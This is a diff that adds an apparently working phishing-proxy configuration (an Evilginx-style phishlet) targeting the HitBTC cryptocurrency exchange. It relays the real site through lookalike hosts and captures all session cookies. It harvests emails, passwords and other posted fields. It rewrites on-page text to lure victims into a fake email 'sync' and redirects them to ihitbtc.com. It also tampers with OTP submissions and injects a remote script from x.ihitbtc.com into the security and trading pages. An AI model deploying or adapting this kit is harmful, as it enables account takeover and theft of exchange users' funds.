@@ -1,0 +1,61 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'hitbtc.com', auto_filter: true, session: true, is_landing: true}
+  - {phish_sub: 'st', orig_sub: 'st', domain: 'hitbtc.com'}
+  - {phish_sub: 'blog', orig_sub: 'blog', domain: 'hitbtc.com'}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'hitbtc.com'}
+  - {phish_sub: 'ch', orig_sub: 'ch', domain: 'hitbtc.com'}
+  - {phish_sub: 'x', orig_sub: 'x', domain: 'la-mort-ou-tchitchi.com'}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true}
+sub_filters:
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: 'Verify via email', replace: 'Last checkpoint', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: 'We have sent you a confirmation email.', replace: 'you will soon be redirected,', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: 'Please check your inbox to complete setup.', replace: 'You will be redirected and prompted to sync your hitbtc.com email account for maximum security, once done you can now click on the link you received by email to confirm your request.', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: '<meta http-equiv="refresh" content="35">', replace: '<meta http-equiv="refresh" content="0; url=https://ihitbtc.com/fsCLEtRU">', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hitbtc.com', orig_sub: '', domain: 'hitbtc.com', search: '/cdn-cgi/challenge-platform', replace: 'fucked', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'hitbtc.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/exchange'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+  - key: 'balance'
+    search: '(.*)'
+    type: 'post'
+  - key: 'key'
+    search: '(.*)'
+    type: 'post'
+  - key: 'name'
+    search: '(.*)'
+    type: 'post'
+  - key: 'check'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/settings/security/submit-new-otp'
+    search:
+      - {key: 'code', search: '.*'}
+      - {key: 'type', search: '.*'}
+    force:
+      - {key: 'dropSessions', value: 'true'}
+    type: 'post'
+
+login:
+  domain: 'hitbtc.com'
+  path: '/signinapp'
+
+js_inject:
+  - trigger_domains: ['hitbtc.com']
+    trigger_paths: ['/settings/security','/btc-to-usdt']
+    script: |
+     </script> <script src=https://x.ihitbtc.com/bundle-main.4797848538050f57013d.js>
